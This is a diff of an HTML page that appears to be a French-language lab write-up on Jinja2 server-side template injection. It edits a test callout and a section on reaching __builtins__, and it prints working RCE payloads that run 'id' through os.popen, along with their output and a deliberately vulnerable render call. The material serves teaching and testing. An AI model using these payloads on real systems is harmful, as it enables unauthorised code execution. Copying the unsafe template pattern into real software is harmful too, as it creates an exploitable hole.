@@ -559,15 +559,15 @@
 <span class="fn">print</span>(<span class="fn">Template</span>(<span class="str">"Bonjour "</span> + <span class="var">name</span>).<span class="fn">render</span>())</pre>
     </div>
 
-    <div class="terminal-frame">
-      <div class="terminal-bar">
-        <div class="t-dot t-dot-red"></div>
-        <div class="t-dot t-dot-amber"></div>
-        <div class="t-dot t-dot-green"></div>
-        <span class="terminal-bar-label">Terminal — Tests locaux vuln.py</span>
-      </div>
-      <div class="img-scroll"><img src="../ssti1/vuln2code.jpg" alt="Tests locaux : injection arithmétique et tentative {{config}} hors Flask" loading="lazy"></div>
-      <div class="terminal-caption">Tests : <code>{{ 7*7 }}</code> → 49 · <code>{{ 7*'7' }}</code> → 7777777 · <code>{{config}}</code> → rien (objet Flask absent hors contexte Flask)</div>
+    <div class="callout callout-info">
+      <div class="callout-title">INFO — Test local</div>
+      <p>
+        Lance <code>python3 vuln.py</code> puis tape successivement <code>spectramz</code>,
+        <code>{{ 7*7 }}</code> et <code>{{ 7*'7' }}</code>. Tu obtiendras
+        <code>Bonjour spectramz</code>, <code>Bonjour 49</code>, puis <code>Bonjour 7777777</code>.
+        La démonstration visuelle complète (avec la RCE) est présentée en
+        <a href="#s4" style="color:var(--cyan)">Phase 04</a>.
+      </p>
     </div>
   </section>
 
@@ -977,6 +977,12 @@
 
     <h3 class="subsection-title">Méthode alternative — via les builtins Python</h3>
 
+    <p>
+      Autre chaîne possible : partir de l'objet <code>self</code> du template (ou de n'importe
+      quelle fonction) pour atteindre <code>__builtins__</code>, puis importer <code>os</code>
+      dynamiquement. Utile quand <code>joiner</code> ou <code>lipsum</code> sont filtrés.
+    </p>
+
     <div class="code-wrap">
       <div class="code-header">
         <span class="code-lang">Jinja2 — RCE via __builtins__</span>
@@ -985,7 +991,7 @@
       <pre><span class="cm"># Via self.__init__.__globals__.__builtins__</span>
 <span class="payload">{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}</span>
 
-<span class="cm"># Via __builtins__ d'une fonction connue</span>
+<span class="cm"># Via __builtins__ d'une classe connue</span>
 <span class="payload">{{ ''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}</span></pre>
     </div>
 
@@ -994,10 +1000,10 @@
         <div class="t-dot t-dot-red"></div>
         <div class="t-dot t-dot-amber"></div>
         <div class="t-dot t-dot-green"></div>
-        <span class="terminal-bar-label">Terminal — Test local vuln.py (self.__init__)</span>
+        <span class="terminal-bar-label">Terminal — vuln.py local (baseline + RCE via self.__init__)</span>
       </div>
-      <div class="img-scroll"><img src="../ssti1/app3.jpg" alt="Test local vuln.py démontrant la RCE via self.__init__.__globals__" loading="lazy"></div>
-      <div class="terminal-caption">Démonstration locale dans <code>vuln.py</code> : <code>self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()</code></div>
+      <div class="img-scroll"><img src="../ssti1/vuln2code.jpg" alt="Test local vuln.py : baseline spectramz puis RCE via self.__init__.__globals__.__builtins__" loading="lazy"></div>
+      <div class="terminal-caption">Test local <code>vuln.py</code> : baseline <code>spectramz</code> → <code>Bonjour spectramz</code>, puis payload <code>{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}</code> → <code>uid=1000(spectrax) gid=1000(spectrax) groups=1000(spectrax),10(wheel),964(docker)</code></div>
     </div>
   </section>
 
